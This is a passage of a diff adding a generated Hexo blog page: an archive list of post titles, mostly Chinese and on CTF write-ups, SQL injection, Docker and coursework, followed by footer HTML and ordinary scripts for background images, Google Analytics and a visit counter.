href="/2018/08/02/sql-inject-protect/">浅谈SQL注入防御手段</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/02/sqlmap-usage/">Sqlmap 使用方法小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/29/Linux-FW/">Linux防火墙学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/26/Mysql-security-1/">Mysql安全配置</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/25/pentest-1/">记录一次模拟渗透</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/20/comp-net-2/">计网实验笔记(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/20/comp-net-1/">计网实验笔记(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/08/weiji-exam/">微机实验考试</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/24/weiji-experiment/">微机实验记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/23/anheng-6month/">安恒6月赛部分做题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/17/python-DataStruct-2/">数据结构复习二 双向链表(python实现)</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/16/python-DataStruct-1/">数据结构复习一 单链表(python实现)</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/08/writing-1/">两年</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/06/Yii-probleam/">编写Yii框架项目时出现的问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/05/susctf2018-wp/">SUSCTF 2018 做题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/31/Docker-CTFd-building/">Docker练习及在CTFd平台上放题目</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/31/CTFd-building/">CTFd平台搭建记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/27/Docker-learning/">Docker学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/25/ISCC-2018-wp/">ISCC 2018做题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/24/anheng-5month/">安恒5月赛web题目做题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/21/cumt-2018-final/">cumt2018校赛部分write up</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/18/git-learning/">Git学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/11/PHP-Yii/">PHP_Yii框架学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/06/whalectf-web1/">WhaleCTF第一期打卡的几个web题目</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/18/shiyanba1-wp/">实验吧 忘记密码了wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/18/phpcheck2/">记一道代码审计题目</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/14/CTF-python/">小结一波CTF里面可能用到的脚本</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/11/Ubantu-Web/">Ubantu下部署LAMP以及复现一道CTF题目</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/11/cumt-php-fanxuliehua/">浅析cumt平台上的一道反序列化题目</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/10/RaceConditionsSummary/">简单小结一下Web条件竞争的题目</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/09/hash-length-attack/">记录一下Hash长度扩展攻击的几个题目</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/06/moctf-web/">简单小结一下moctf的三道web题</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/03/backup-blog-again/">重装系统后快速恢复hexo博客(保留了原有的博客文件夹)</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/25/RSA-SimpleLearn/">大致了解一下RSA以及出题套路</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/24/CRC32-Brute/">CRC32爆破小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/23/Linux-learn/">熟悉Linux命令~~~</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/17/bugku-php-check/">bugku 代码审计 write up</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/14/bugku-Web-write-up/">bugku Web write up</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/14/bugku-Misc/">bugku Misc write up</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/12/bugku-Crypto/">bugku Crypto write up</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/08/bugku-social-wp/">bugku Social write up</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/08/zipfalse/">zip伪加密[转载]</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/07/php-mysql-content/">php+mysql留言板实现代码分享</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/04/sql-Summary/">对数据库学习的大致总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/02/php summary/">php留言板编写总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/28/Csharp-work4/">程序设计课 C#的作业报告四</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/28/Csharp-work3/">程序设计课 C#的作业报告三</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/28/Csharp-work2/">程序设计课 C#作业报告二</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/28/Csharp-work1/">程序设计课 C#的作业报告一</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2017-2018 0verWatch
+
+            </div>
+            <div class="footer-right">
+                Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> 
+                <span>|  Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a></span>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+
+                
+
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdnjs.cloudflare.com/ajax/libs/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-119588656-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        $("a[target=_blank]").removeAttr("target");
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
